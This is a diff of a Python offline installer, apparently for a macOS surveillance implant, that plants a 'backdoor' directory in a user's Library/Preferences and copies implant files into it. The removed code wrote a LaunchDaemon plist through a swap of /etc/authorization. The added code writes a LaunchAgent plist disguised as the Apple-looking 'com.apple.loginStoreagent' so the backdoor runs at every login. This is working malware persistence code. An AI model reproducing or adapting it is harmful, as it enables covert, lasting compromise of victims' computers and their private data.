@@ -1242,80 +1242,54 @@ class OfflineInstall(object):
 				break
 
 		#
-		# hdir con un '_' indica la directory temporanea dove vengono droppati i file per l'installazione
+		# Directory dove vengono droppati i file per l'installazione
 		##			
-		temp_backdoor_path = "/mnt" + home + "/Library/Preferences/" + self.backconf['hdir'] + "_"
-		temporary_loader = "4872364829"
-		mdworker_plist_content =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" \
-					  "<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" \
-					  "<plist version=\"1.0\">\n" \
-					  "<dict>\n" \
-					  "<key>Label</key>\n" \
-					  "<string>com.apple.mdworkers." + user + "</string>\n" \
-					  "<key>ProgramArguments</key>\n" \
-					  "<array>\n" \
-					  "<string>" + home + "/Library/Preferences/" + self.backconf['hdir'] + "_/" + temporary_loader + "</string>\n" \
-					  "<string>" + user +"</string>\n" \
-					  "<string>" + self.backconf['hdir'] +"</string>\n" \
-					  "<string>" + self.backconf['hcore'] +"</string>\n" \
-					  "</array>\n" \
-					  "<key>KeepAlive</key>\n" \
-					  "<dict>\n" \
-					  "<key>SuccessfulExit</key>\n" \
-					  "<false/>\n" \
-					  "</dict>\n" \
-					  "</dict>\n" \
-					  "</plist>"
-		plist_path = "/mnt/System/Library/LaunchDaemons/com.apple.mdworkers." + user + ".plist"
+		the_backdoor_path = "/mnt" + home + "/Library/Preferences/" + self.backconf['hdir']
+		current_backdoor_name = "com.apple.loginStoreagent"
+		mdworker_plist_content = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" \
+					"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" \
+					"<plist version=\"1.0\">\n" \
+					"<dict>\n" \
+					"<key>Label</key>\n" \
+					"<string>" + current_backdoor_name + "</string>\n" \
+					"<key>LimitLoadToSessionType</key>\n" \
+					"<string>Aqua</string>\n" \
+					"<key>OnDemand</key>\n" \
+					"<false/>\n" \
+					"<key>ProgramArguments</key>\n" \
+					"<array>\n" \
+					"<string>" + home + "/Library/Preferences/" + self.backconf['hdir'] + "/" + self.backconf['hcore'] + "</string>\n" \
+					"</array>\n" \
+					"<key>WorkingDirectory</key>\n" \
+					"<string>" + home + "/Library/Preferences/" + self.backconf['hdir'] + "</string>\n" \
+					"</dict>\n" \
+					"</plist>"
+		plist_path = "/mnt" + home + "/Library/LaunchAgents/" + current_backdoor_name + ".plist"
 
 		#
-		# Crea la directory temporanea
+		# Crea la directory 
 		##
 		try:
-			os.mkdir(temp_backdoor_path)
-			print("    Create tmp backdoor directory [OK] -> " + temp_backdoor_path)
+			os.mkdir(the_backdoor_path)
+			print("    Create backdoor directory [OK] -> " + the_backdoor_path)
 		except:
-			print("    Create tmp backdoor directory [ERROR] -> " + temp_backdoor_path)
+			print("    Create backdoor directory [ERROR] -> " + the_backdoor_path)
 			pass
 
-		os.chown(temp_backdoor_path, int(uid), int(gid))
+		os.chown(the_backdoor_path, int(uid), int(gid))
+		os.chmod(the_backdoor_path, 0o755)
 
 		#
 		# Crea l'mdworker per il primo avvio
 		##
-		source_path = "/mnt/private/etc/authorization"
-		dest_path = "/mnt/private/etc/authorization.bu"
-		shutil.copyfile(source_path, dest_path)
-
-		dest_path = "/mnt/private/etc/authorization.mod"
-		os.rename(source_path, dest_path)
-			
-		hfile = open(dest_path, "w")
-		hfile.truncate()
+		hfile = open(plist_path, "w")
 		hfile.write(mdworker_plist_content)
 		hfile.close()
 
-		dest_path = "/mnt/private/etc/authorization"
-		source_path = "/mnt/private/etc/authorization.bu"
-		shutil.copyfile(source_path, dest_path)
-		os.remove(source_path)
-
-		source_path = "/mnt/private/etc/authorization.mod"
-		os.rename(source_path, plist_path)
+		os.chown(plist_path, int(uid), int(gid))
+		os.chmod(plist_path, 0o644)
 
 		print("    Create MdWorker for first boot [OK] -> " + plist_path)
-
-		#
-		# Crea un marker nella directory temporanea
-		##
-		plist_path = temp_backdoor_path + "/00"
-		hfile = open(plist_path, "w")
-		hfile.write("00")
-		hfile.close()
-		os.chown(plist_path, int(uid), int(gid))
-		os.chmod(plist_path, 0o755)
-
-		print("    Create Marker in the tmp backdoor directory [OK] -> " + plist_path)
 
 		try:
 			os.mkdir("/mnt2/")
@@ -1345,7 +1319,7 @@ class OfflineInstall(object):
 			return False
 
 		#
-		# Copia i file nella directory temporanea
+		# Copia i file nella directory
 		##
 		files_path = "/mnt2/RCSPE/files/OSX"
 		files = os.listdir(files_path)
@@ -1355,7 +1329,7 @@ class OfflineInstall(object):
 				continue
  
 			tmp_path = files_path + "/" + hfind
-			tmp_path2 = temp_backdoor_path + "/" + hfind
+			tmp_path2 = the_backdoor_path + "/" + hfind
 			shutil.copyfile(tmp_path, tmp_path2)
 			os.chown(tmp_path2, int(uid), int(gid))
 			os.chmod(tmp_path2, 0o755)
